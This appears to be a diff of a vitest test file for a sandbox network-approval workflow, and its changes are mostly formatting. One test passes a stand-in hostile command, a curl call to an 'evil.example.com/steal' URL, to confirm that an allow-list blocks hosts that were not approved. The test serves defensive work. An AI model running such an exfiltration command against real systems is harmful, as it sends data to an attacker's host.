@@ -14,9 +14,10 @@
  * - Rejection: no retry attempted
  * - No-approval-needed: command that doesn't need network succeeds directly
  */
-import { describe, expect, it } from "vitest";
-import { start, resumeHook } from "workflow/api";
+
 import { waitForHook } from "@workflow/vitest";
+import { describe, expect, it } from "vitest";
+import { resumeHook, start } from "workflow/api";
 import { networkApprovalWorkflow } from "./network-approval.js";
 
 const HOST = "https://api.github.com";
@@ -47,8 +48,8 @@ describe("network approval workflow", () => {
     // the key assertion is that we did NOT get "command not found" or
     // "Network access denied" — the allow-list accepted the host.
     expect(result.secondAttempt).not.toBeNull();
-    expect(result.secondAttempt!.stderr).not.toContain("command not found");
-    expect(result.secondAttempt!.stderr).not.toContain("Network access denied");
+    expect(result.secondAttempt.stderr).not.toContain("command not found");
+    expect(result.secondAttempt.stderr).not.toContain("Network access denied");
     expect(result.grantedHosts).toEqual([HOST]);
   });
 
@@ -56,7 +57,10 @@ describe("network approval workflow", () => {
     const WRONG_HOST = "https://evil.example.com";
     const WRONG_SCRIPT = `curl ${WRONG_HOST}/steal`;
 
-    const run = await start(networkApprovalWorkflow, [WRONG_SCRIPT, WRONG_HOST]);
+    const run = await start(networkApprovalWorkflow, [
+      WRONG_SCRIPT,
+      WRONG_HOST,
+    ]);
 
     await waitForHook(run, { token: `network-approval:${WRONG_HOST}` });
 
@@ -70,8 +74,8 @@ describe("network approval workflow", () => {
 
     expect(result.status).toBe("approved");
     // Second attempt should be blocked by the allow-list
-    expect(result.secondAttempt!.stderr).toContain("Network access denied");
-    expect(result.secondAttempt!.exitCode).not.toBe(0);
+    expect(result.secondAttempt.stderr).toContain("Network access denied");
+    expect(result.secondAttempt.exitCode).not.toBe(0);
   });
 
   it("rejects access — no retry attempted", async () => {
@@ -93,10 +97,7 @@ describe("network approval workflow", () => {
   });
 
   it("no approval needed when command succeeds without network", async () => {
-    const run = await start(networkApprovalWorkflow, [
-      "echo hello",
-      "none",
-    ]);
+    const run = await start(networkApprovalWorkflow, ["echo hello", "none"]);
 
     const result = await run.returnValue;
 
